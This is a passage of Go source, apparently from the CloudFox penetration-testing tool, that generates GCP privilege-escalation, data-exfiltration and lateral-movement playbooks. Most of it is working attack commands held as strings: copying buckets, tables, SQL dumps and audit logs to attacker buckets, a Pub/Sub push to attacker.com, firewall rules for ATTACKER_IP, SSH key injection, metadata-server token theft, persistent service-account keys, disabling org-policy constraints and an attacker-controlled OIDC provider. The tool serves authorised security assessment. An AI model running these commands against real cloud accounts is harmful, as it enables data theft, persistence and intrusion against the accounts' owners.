		sections.WriteString("# Create OIDC provider pointing to attacker-controlled IdP\n")
		sections.WriteString("gcloud iam workload-identity-pools providers create-oidc attacker-provider \\\n")
		sections.WriteString("    --location=global \\\n")
		sections.WriteString("    --workload-identity-pool=attacker-pool \\\n")
		sections.WriteString("    --issuer-uri='https://attacker-idp.example.com' \\\n")
		sections.WriteString("    --attribute-mapping='google.subject=assertion.sub'\n\n")
		sections.WriteString("# Grant the pool's identities ability to impersonate a SA\n")
		sections.WriteString("gcloud iam service-accounts add-iam-policy-binding \\\n")
		sections.WriteString("    PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --role=roles/iam.workloadIdentityUser \\\n")
		sections.WriteString("    --member='principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/attacker-pool/*'\n")
		sections.WriteString("```\n\n")
	}

	// Org Policy
	if len(categories["Org Policy"]) > 0 {
		sections.WriteString("## Organization Policy Exploitation\n\n")
		sections.WriteString("Principals with org policy permissions can disable security constraints across the organization.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Org Policy"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Disable domain restricted sharing constraint\n")
		sections.WriteString("cat > policy.yaml << 'EOF'\n")
		sections.WriteString("constraint: constraints/iam.allowedPolicyMemberDomains\n")
		sections.WriteString("listPolicy:\n")
		sections.WriteString("  allValues: ALLOW\n")
		sections.WriteString("EOF\n")
		sections.WriteString("gcloud org-policies set-policy policy.yaml --project=PROJECT_ID\n\n")
		sections.WriteString("# Disable service account key creation constraint\n")
		sections.WriteString("cat > policy.yaml << 'EOF'\n")
		sections.WriteString("constraint: constraints/iam.disableServiceAccountKeyCreation\n")
		sections.WriteString("booleanPolicy:\n")
		sections.WriteString("  enforced: false\n")
		sections.WriteString("EOF\n")
		sections.WriteString("gcloud org-policies set-policy policy.yaml --project=PROJECT_ID\n")
		sections.WriteString("```\n\n")
	}

	// Network Access
	if len(categories["Network Access"]) > 0 {
		sections.WriteString("## Network Access Exploitation\n\n")
		sections.WriteString("Principals with network access permissions can create tunnels or modify firewall rules to access internal resources.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Network Access"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - IAP Tunnel:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Start IAP tunnel to SSH port\n")
		sections.WriteString("gcloud compute start-iap-tunnel INSTANCE_NAME 22 \\\n")
		sections.WriteString("    --local-host-port=localhost:2222 \\\n")
		sections.WriteString("    --zone=us-central1-a\n\n")
		sections.WriteString("# SSH through the tunnel\n")
		sections.WriteString("ssh -p 2222 user@localhost\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - Firewall Rules:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create firewall rule allowing attacker IP\n")
		sections.WriteString("gcloud compute firewall-rules create allow-attacker \\\n")
		sections.WriteString("    --network=default \\\n")
		sections.WriteString("    --allow=tcp:22,tcp:3389,tcp:443 \\\n")
		sections.WriteString("    --source-ranges=ATTACKER_IP/32\n")
		sections.WriteString("```\n\n")
	}

	return sections.String()
}

// GenerateExfilPlaybook generates a comprehensive data exfiltration playbook from attack paths
func GenerateExfilPlaybook(paths []AttackPath, identityHeader string) string {
	if len(paths) == 0 {
		return ""
	}

	var sections strings.Builder
	if identityHeader != "" {
		sections.WriteString(fmt.Sprintf(`# Data Exfiltration Playbook for %s
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified data exfiltration capabilities.

`, identityHeader))
	} else {
		sections.WriteString(`# GCP Data Exfiltration Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified data exfiltration capabilities.

`)
	}

	// Group by category - includes both permission-based paths and actual misconfigurations
	categories := map[string][]AttackPath{
		// Permission-based categories
		"Storage":          {},
		"BigQuery":         {},
		"Compute Export":   {},
		"Database":         {},
		"Logging":          {},
		"Messaging":        {},
		"Secrets":          {},
		"Storage Transfer": {},
		"Encryption":       {},
		// Actual misconfiguration categories
		"Public Snapshot":       {},
		"Public Image":          {},
		"Public Bucket":         {},
		"Logging Sink":          {},
		"Pub/Sub Push":          {},
		"Pub/Sub BigQuery Export": {},
		"Pub/Sub GCS Export":    {},
		"Public BigQuery":       {},
		"Cloud SQL Export":      {},
		"Storage Transfer Job":  {},
		// Potential vector categories
		"Potential Vector":      {},
	}

	for _, path := range paths {
		if _, ok := categories[path.Category]; ok {
			categories[path.Category] = append(categories[path.Category], path)
		}
	}

	// Storage
	if len(categories["Storage"]) > 0 {
		sections.WriteString("## Cloud Storage Exfiltration\n\n")
		sections.WriteString("Principals with storage permissions can read or export data from Cloud Storage buckets.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Storage"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s at %s\n", path.Principal, path.PrincipalType, path.Method, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all buckets\n")
		sections.WriteString("gcloud storage buckets list --project=PROJECT_ID\n\n")
		sections.WriteString("# List objects in a bucket\n")
		sections.WriteString("gcloud storage ls gs://BUCKET_NAME/\n\n")
		sections.WriteString("# Download all objects\n")
		sections.WriteString("gcloud storage cp -r gs://BUCKET_NAME/ ./exfil/\n\n")
		sections.WriteString("# Copy to attacker-controlled bucket\n")
		sections.WriteString("gcloud storage cp -r gs://VICTIM_BUCKET/ gs://ATTACKER_BUCKET/\n")
		sections.WriteString("```\n\n")
	}

	// BigQuery
	if len(categories["BigQuery"]) > 0 {
		sections.WriteString("## BigQuery Exfiltration\n\n")
		sections.WriteString("Principals with BigQuery permissions can query or export data.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["BigQuery"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s at %s\n", path.Principal, path.PrincipalType, path.Method, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List datasets\n")
		sections.WriteString("bq ls --project_id=PROJECT_ID\n\n")
		sections.WriteString("# List tables in dataset\n")
		sections.WriteString("bq ls PROJECT_ID:DATASET_NAME\n\n")
		sections.WriteString("# Query data\n")
		sections.WriteString("bq query --use_legacy_sql=false 'SELECT * FROM `PROJECT.DATASET.TABLE` LIMIT 1000'\n\n")
		sections.WriteString("# Export to GCS\n")
		sections.WriteString("bq extract PROJECT:DATASET.TABLE gs://ATTACKER_BUCKET/exfil.csv\n")
		sections.WriteString("```\n\n")
	}

	// Compute Export
	if len(categories["Compute Export"]) > 0 {
		sections.WriteString("## Compute Exfiltration\n\n")
		sections.WriteString("Principals with compute permissions can export snapshots and images.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Compute Export"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create snapshot of disk\n")
		sections.WriteString("gcloud compute disks snapshot DISK_NAME --zone=ZONE --snapshot-names=exfil-snap\n\n")
		sections.WriteString("# Export snapshot to external project\n")
		sections.WriteString("gcloud compute snapshots add-iam-policy-binding exfil-snap \\\n")
		sections.WriteString("    --member='user:attacker@external.com' --role='roles/compute.storageAdmin'\n\n")
		sections.WriteString("# Create image from disk\n")
		sections.WriteString("gcloud compute images create exfil-image --source-disk=DISK --source-disk-zone=ZONE\n")
		sections.WriteString("```\n\n")
	}

	// Database
	if len(categories["Database"]) > 0 {
		sections.WriteString("## Database Exfiltration\n\n")
		sections.WriteString("Principals with database permissions can export database data.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Database"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List Cloud SQL instances\n")
		sections.WriteString("gcloud sql instances list --project=PROJECT_ID\n\n")
		sections.WriteString("# Export database to GCS\n")
		sections.WriteString("gcloud sql export sql INSTANCE_NAME gs://BUCKET/export.sql --database=DATABASE\n\n")
		sections.WriteString("# Connect to instance\n")
		sections.WriteString("gcloud sql connect INSTANCE_NAME --user=USER\n")
		sections.WriteString("```\n\n")
	}

	// Logging
	if len(categories["Logging"]) > 0 {
		sections.WriteString("## Logging Exfiltration\n\n")
		sections.WriteString("Principals with logging permissions can access or export logs.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Logging"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Read logs\n")
		sections.WriteString("gcloud logging read 'resource.type=\"gce_instance\"' --project=PROJECT_ID --limit=100\n\n")
		sections.WriteString("# Create sink to export logs\n")
		sections.WriteString("gcloud logging sinks create exfil-sink \\\n")
		sections.WriteString("    storage.googleapis.com/ATTACKER_BUCKET --project=PROJECT_ID\n")
		sections.WriteString("```\n\n")
	}

	// Secrets
	if len(categories["Secrets"]) > 0 {
		sections.WriteString("## Secret Exfiltration\n\n")
		sections.WriteString("Principals with secret access can retrieve sensitive credentials.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Secrets"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all secrets\n")
		sections.WriteString("gcloud secrets list --project=PROJECT_ID\n\n")
		sections.WriteString("# Access secret value\n")
		sections.WriteString("gcloud secrets versions access latest --secret=SECRET_NAME --project=PROJECT_ID\n")
		sections.WriteString("```\n\n")
	}

	// Storage Transfer
	if len(categories["Storage Transfer"]) > 0 {
		sections.WriteString("## Storage Transfer Exfiltration\n\n")
		sections.WriteString("Principals with storage transfer permissions can create jobs to external clouds.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Storage Transfer"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create transfer job to AWS S3\n")
		sections.WriteString("gcloud transfer jobs create \\\n")
		sections.WriteString("    gs://SOURCE_BUCKET \\\n")
		sections.WriteString("    s3://ATTACKER_BUCKET \\\n")
		sections.WriteString("    --source-creds-file=gcp-creds.json\n")
		sections.WriteString("```\n\n")
	}

	// ==========================================
	// ACTUAL MISCONFIGURATIONS (not just permissions)
	// ==========================================

	// Public Snapshots
	if len(categories["Public Snapshot"]) > 0 {
		sections.WriteString("## Public Compute Snapshots\n\n")
		sections.WriteString("These snapshots are publicly accessible and can be used to create disks in attacker-controlled projects.\n\n")
		sections.WriteString("### Vulnerable Snapshots:\n")
		for _, path := range categories["Public Snapshot"] {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", path.TargetResource, path.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create disk from public snapshot in attacker project\n")
		sections.WriteString("gcloud compute disks create exfil-disk \\\n")
		sections.WriteString("    --source-snapshot=projects/VICTIM_PROJECT/global/snapshots/SNAPSHOT_NAME \\\n")
		sections.WriteString("    --zone=us-central1-a \\\n")
		sections.WriteString("    --project=ATTACKER_PROJECT\n\n")
		sections.WriteString("# Attach disk to instance\n")
		sections.WriteString("gcloud compute instances attach-disk INSTANCE \\\n")
		sections.WriteString("    --disk=exfil-disk --zone=us-central1-a\n\n")
		sections.WriteString("# Mount and access data\n")
		sections.WriteString("sudo mkdir /mnt/exfil && sudo mount /dev/sdb1 /mnt/exfil\n")
		sections.WriteString("```\n\n")
	}

	// Public Images
	if len(categories["Public Image"]) > 0 {
		sections.WriteString("## Public Compute Images\n\n")
		sections.WriteString("These images are publicly accessible and may contain sensitive data or credentials.\n\n")
		sections.WriteString("### Vulnerable Images:\n")
		for _, path := range categories["Public Image"] {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", path.TargetResource, path.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create instance from public image in attacker project\n")
		sections.WriteString("gcloud compute instances create exfil-vm \\\n")
		sections.WriteString("    --image=projects/VICTIM_PROJECT/global/images/IMAGE_NAME \\\n")
		sections.WriteString("    --zone=us-central1-a \\\n")
		sections.WriteString("    --project=ATTACKER_PROJECT\n\n")
		sections.WriteString("# Access the instance and search for credentials\n")
		sections.WriteString("gcloud compute ssh exfil-vm --zone=us-central1-a\n")
		sections.WriteString("find / -name '*.pem' -o -name '*.key' -o -name 'credentials*' 2>/dev/null\n")
		sections.WriteString("```\n\n")
	}

	// Public Buckets
	if len(categories["Public Bucket"]) > 0 {
		sections.WriteString("## Public Storage Buckets\n\n")
		sections.WriteString("These buckets are publicly accessible.\n\n")
		sections.WriteString("### Vulnerable Buckets:\n")
		for _, path := range categories["Public Bucket"] {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", path.TargetResource, path.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List bucket contents\n")
		sections.WriteString("gsutil ls -r gs://BUCKET_NAME/\n\n")
		sections.WriteString("# Download all data\n")
		sections.WriteString("gsutil -m cp -r gs://BUCKET_NAME/ ./exfil/\n\n")
		sections.WriteString("# Search for sensitive files\n")
		sections.WriteString("gsutil ls -r gs://BUCKET_NAME/ | grep -E '\\.(pem|key|json|env|config)$'\n")
		sections.WriteString("```\n\n")
	}

	// Logging Sinks
	if len(categories["Logging Sink"]) > 0 {
		sections.WriteString("## Cross-Project Logging Sinks\n\n")
		sections.WriteString("These logging sinks export logs to external destinations.\n\n")
		sections.WriteString("### Identified Sinks:\n")
		for _, path := range categories["Logging Sink"] {
			dest := path.Description
			if dest == "" {
				dest = path.TargetResource
			}
			sections.WriteString(fmt.Sprintf("- %s -> %s\n", path.TargetResource, dest))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create logging sink to attacker-controlled destination\n")
		sections.WriteString("gcloud logging sinks create exfil-sink \\\n")
		sections.WriteString("    pubsub.googleapis.com/projects/ATTACKER_PROJECT/topics/exfil-logs \\\n")
		sections.WriteString("    --log-filter='resource.type=\"gce_instance\"'\n\n")
		sections.WriteString("# Export all audit logs\n")
		sections.WriteString("gcloud logging sinks create audit-exfil \\\n")
		sections.WriteString("    storage.googleapis.com/ATTACKER_BUCKET \\\n")
		sections.WriteString("    --log-filter='protoPayload.@type=\"type.googleapis.com/google.cloud.audit.AuditLog\"'\n")
		sections.WriteString("```\n\n")
	}

	// Pub/Sub paths (combine all Pub/Sub categories)
	pubsubPaths := append(categories["Pub/Sub Push"], categories["Pub/Sub BigQuery Export"]...)
	pubsubPaths = append(pubsubPaths, categories["Pub/Sub GCS Export"]...)
	if len(pubsubPaths) > 0 {
		sections.WriteString("## Pub/Sub Exfiltration Paths\n\n")
		sections.WriteString("These Pub/Sub configurations enable data exfiltration.\n\n")
		sections.WriteString("### Identified Paths:\n")
		for _, path := range pubsubPaths {
			dest := path.Description
			if dest == "" {
				dest = path.TargetResource
			}
			sections.WriteString(fmt.Sprintf("- %s -> %s\n", path.TargetResource, dest))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create push subscription to attacker endpoint\n")
		sections.WriteString("gcloud pubsub subscriptions create exfil-sub \\\n")
		sections.WriteString("    --topic=TOPIC_NAME \\\n")
		sections.WriteString("    --push-endpoint=https://attacker.com/receive\n\n")
		sections.WriteString("# Or create pull subscription and export\n")
		sections.WriteString("gcloud pubsub subscriptions create exfil-pull --topic=TOPIC_NAME\n")
		sections.WriteString("gcloud pubsub subscriptions pull exfil-pull --limit=1000 --auto-ack\n")
		sections.WriteString("```\n\n")
	}

	// Public BigQuery
	if len(categories["Public BigQuery"]) > 0 {
		sections.WriteString("## Public BigQuery Datasets\n\n")
		sections.WriteString("These BigQuery datasets are publicly accessible.\n\n")
		sections.WriteString("### Vulnerable Datasets:\n")
		for _, path := range categories["Public BigQuery"] {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", path.TargetResource, path.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Export table to GCS bucket\n")
		sections.WriteString("bq extract \\\n")
		sections.WriteString("    --destination_format=NEWLINE_DELIMITED_JSON \\\n")
		sections.WriteString("    'PROJECT:DATASET.TABLE' \\\n")
		sections.WriteString("    gs://ATTACKER_BUCKET/exfil/data-*.json\n\n")
		sections.WriteString("# Query and save locally\n")
		sections.WriteString("bq query --format=json 'SELECT * FROM PROJECT.DATASET.TABLE' > exfil.json\n\n")
		sections.WriteString("# Copy dataset to attacker project\n")
		sections.WriteString("bq cp PROJECT:DATASET.TABLE ATTACKER_PROJECT:EXFIL_DATASET.TABLE\n")
		sections.WriteString("```\n\n")
	}

	// Cloud SQL Export
	if len(categories["Cloud SQL Export"]) > 0 {
		sections.WriteString("## Cloud SQL Export Capabilities\n\n")
		sections.WriteString("These Cloud SQL instances have export capabilities.\n\n")
		sections.WriteString("### Identified Instances:\n")
		for _, path := range categories["Cloud SQL Export"] {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", path.TargetResource, path.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Export database to GCS\n")
		sections.WriteString("gcloud sql export sql INSTANCE_NAME \\\n")
		sections.WriteString("    gs://ATTACKER_BUCKET/exfil/dump.sql \\\n")
		sections.WriteString("    --database=DATABASE_NAME\n\n")
		sections.WriteString("# Export as CSV\n")
		sections.WriteString("gcloud sql export csv INSTANCE_NAME \\\n")
		sections.WriteString("    gs://ATTACKER_BUCKET/exfil/data.csv \\\n")
		sections.WriteString("    --database=DATABASE_NAME \\\n")
		sections.WriteString("    --query='SELECT * FROM sensitive_table'\n")
		sections.WriteString("```\n\n")
	}

	// Storage Transfer Jobs (actual misconfigured jobs)
	if len(categories["Storage Transfer Job"]) > 0 {
		sections.WriteString("## Storage Transfer Service Jobs\n\n")
		sections.WriteString("These storage transfer jobs export data to external destinations.\n\n")
		sections.WriteString("### Identified Jobs:\n")
		for _, path := range categories["Storage Transfer Job"] {
			dest := path.Description
			if dest == "" {
				dest = path.TargetResource
			}
			sections.WriteString(fmt.Sprintf("- %s -> %s\n", path.TargetResource, dest))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create transfer job to external AWS S3\n")
		sections.WriteString("gcloud transfer jobs create \\\n")
		sections.WriteString("    gs://SOURCE_BUCKET \\\n")
		sections.WriteString("    s3://attacker-bucket \\\n")
		sections.WriteString("    --source-creds-file=gcs-creds.json\n")
		sections.WriteString("```\n\n")
	}

	// Potential Vectors
	if len(categories["Potential Vector"]) > 0 {
		sections.WriteString("## Potential Exfiltration Vectors\n\n")
		sections.WriteString("These resources could be used for data exfiltration if compromised.\n\n")
		sections.WriteString("### Identified Vectors:\n")
		for _, path := range categories["Potential Vector"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) in %s\n", path.TargetResource, path.Method, path.ProjectID))
		}
		sections.WriteString("\n")
	}

	return sections.String()
}

// GenerateLateralPlaybook generates a comprehensive lateral movement playbook from attack paths
func GenerateLateralPlaybook(paths []AttackPath, identityHeader string) string {
	if len(paths) == 0 {
		return ""
	}

	var sections strings.Builder
	if identityHeader != "" {
		sections.WriteString(fmt.Sprintf(`# Lateral Movement Playbook for %s
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified lateral movement capabilities.

`, identityHeader))
	} else {
		sections.WriteString(`# GCP Lateral Movement Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified lateral movement capabilities.

`)
	}

	// Group by category
	categories := map[string][]AttackPath{
		"Network":                      {},
		"SA Impersonation":             {},
		"Compute Sharing":              {},
		"Compute Access":               {},
		"GKE":                          {},
		"Database Access":              {},
		"Shared VPC":                   {},
		"Service Account Impersonation": {},
		"Service Account Key Creation":  {},
		"Compute Instance Token Theft":  {},
		"Cloud Function Token Theft":    {},
		"Cloud Run Token Theft":         {},
		"GKE Cluster Token Theft":       {},
		"GKE Node Pool Token Theft":     {},
	}

	for _, path := range paths {
		if _, ok := categories[path.Category]; ok {
			categories[path.Category] = append(categories[path.Category], path)
		}
	}

	// Network
	if len(categories["Network"]) > 0 {
		sections.WriteString("## Network-Based Lateral Movement\n\n")
		sections.WriteString("Principals with network permissions can modify network configurations for lateral movement.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Network"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - VPC Peering:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create VPC peering to another project's network\n")
		sections.WriteString("gcloud compute networks peerings create pivot \\\n")
		sections.WriteString("    --network=SOURCE_NETWORK \\\n")
		sections.WriteString("    --peer-network=projects/TARGET_PROJECT/global/networks/TARGET_NETWORK\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - Firewall Rules:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create firewall rule to allow access\n")
		sections.WriteString("gcloud compute firewall-rules create allow-pivot \\\n")
		sections.WriteString("    --network=NETWORK --allow=tcp:22,tcp:3389 \\\n")
		sections.WriteString("    --source-ranges=ATTACKER_IP/32\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - IAP Tunnel:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Start IAP tunnel to SSH port\n")
		sections.WriteString("gcloud compute start-iap-tunnel INSTANCE_NAME 22 \\\n")
		sections.WriteString("    --local-host-port=localhost:2222 --zone=us-central1-a\n\n")
		sections.WriteString("# SSH through the tunnel\n")
		sections.WriteString("ssh -p 2222 user@localhost\n")
		sections.WriteString("```\n\n")
	}

	// SA Impersonation
	if len(categories["SA Impersonation"]) > 0 {
		sections.WriteString("## Service Account Impersonation\n\n")
		sections.WriteString("Principals with impersonation capabilities can pivot to other service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["SA Impersonation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Generate access token for target SA\n")
		sections.WriteString("gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Use token with any gcloud command\n")
		sections.WriteString("gcloud compute instances list --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// Compute Access
	if len(categories["Compute Access"]) > 0 {
		sections.WriteString("## Compute Instance Access\n\n")
		sections.WriteString("Principals with compute access can SSH into instances via OS Login or metadata modification.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Compute Access"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# SSH via OS Login (compute.instances.osLogin)\n")
		sections.WriteString("gcloud compute ssh INSTANCE --zone=ZONE --project=PROJECT\n\n")
		sections.WriteString("# SSH via OS Login with sudo (compute.instances.osAdminLogin)\n")
		sections.WriteString("gcloud compute ssh INSTANCE --zone=ZONE --project=PROJECT\n")
		sections.WriteString("# Then run: sudo su\n\n")
		sections.WriteString("# Inject SSH key via instance metadata\n")
		sections.WriteString("gcloud compute instances add-metadata INSTANCE --zone=ZONE \\\n")
		sections.WriteString("    --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\"\n\n")
		sections.WriteString("# Inject SSH key project-wide\n")
		sections.WriteString("gcloud compute project-info add-metadata \\\n")
		sections.WriteString("    --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\"\n")
		sections.WriteString("```\n\n")
	}

	// GKE
	if len(categories["GKE"]) > 0 {
		sections.WriteString("## GKE Cluster Access\n\n")
		sections.WriteString("Principals with GKE permissions can access clusters and pivot within them.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["GKE"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Get cluster credentials\n")
		sections.WriteString("gcloud container clusters get-credentials CLUSTER --zone=ZONE --project=PROJECT\n\n")
		sections.WriteString("# If Workload Identity is NOT enabled, steal node SA token from any pod:\n")
		sections.WriteString("kubectl exec -it POD -- curl -s -H 'Metadata-Flavor: Google' \\\n")
		sections.WriteString("    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'\n\n")
		sections.WriteString("# List secrets for credentials\n")
		sections.WriteString("kubectl get secrets -A -o yaml\n")
		sections.WriteString("```\n\n")
	}

	// Database Access
	if len(categories["Database Access"]) > 0 {
		sections.WriteString("## Database Access\n\n")
		sections.WriteString("Principals with database permissions can connect to database instances.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Database Access"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Connect to Cloud SQL instance\n")
		sections.WriteString("gcloud sql connect INSTANCE_NAME --user=USER --project=PROJECT\n\n")
		sections.WriteString("# Create database user for persistence\n")
		sections.WriteString("gcloud sql users create attacker --instance=INSTANCE_NAME --password=PASSWORD\n")
		sections.WriteString("```\n\n")
	}

	// Compute Sharing
	if len(categories["Compute Sharing"]) > 0 {
		sections.WriteString("## Compute Resource Sharing\n\n")
		sections.WriteString("Principals with compute sharing permissions can share images/snapshots with external projects.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Compute Sharing"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Share VM image with external project\n")
		sections.WriteString("gcloud compute images add-iam-policy-binding IMAGE_NAME \\\n")
		sections.WriteString("    --member='user:attacker@external.com' --role='roles/compute.imageUser'\n\n")
		sections.WriteString("# Share snapshot with external project\n")
		sections.WriteString("gcloud compute snapshots add-iam-policy-binding SNAPSHOT_NAME \\\n")
		sections.WriteString("    --member='user:attacker@external.com' --role='roles/compute.storageAdmin'\n")
		sections.WriteString("```\n\n")
	}

	// Service Account Impersonation (from lateral movement module)
	if len(categories["Service Account Impersonation"]) > 0 {
		sections.WriteString("## Service Account Impersonation Chains\n\n")
		sections.WriteString("These principals can impersonate service accounts to gain their permissions.\n\n")
		sections.WriteString("### Identified Chains:\n")
		for _, path := range categories["Service Account Impersonation"] {
			sections.WriteString(fmt.Sprintf("- %s -> %s\n", path.Principal, path.TargetResource))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Generate access token for target SA\n")
		sections.WriteString("gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Use token with any gcloud command\n")
		sections.WriteString("gcloud compute instances list --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// Service Account Key Creation
	if len(categories["Service Account Key Creation"]) > 0 {
		sections.WriteString("## Service Account Key Creation\n\n")
		sections.WriteString("These principals can create persistent keys for service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Service Account Key Creation"] {
			sections.WriteString(fmt.Sprintf("- %s can create keys for %s\n", path.Principal, path.TargetResource))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create persistent key for long-term access\n")
		sections.WriteString("gcloud iam service-accounts keys create key.json \\\n")
		sections.WriteString("    --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Activate the key\n")
		sections.WriteString("gcloud auth activate-service-account --key-file=key.json\n")
		sections.WriteString("```\n\n")
	}

	// Compute Instance Token Theft
	if len(categories["Compute Instance Token Theft"]) > 0 {
		sections.WriteString("## Compute Instance Token Theft\n\n")
		sections.WriteString("These compute instances have attached service accounts whose tokens can be stolen via the metadata server.\n\n")
		sections.WriteString("### Vulnerable Instances:\n")
		for _, path := range categories["Compute Instance Token Theft"] {
			sections.WriteString(fmt.Sprintf("- %s (SA: %s) in %s\n", path.Principal, path.TargetResource, path.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# SSH into the instance\n")
		sections.WriteString("gcloud compute ssh INSTANCE_NAME --zone=ZONE --project=PROJECT_ID\n\n")
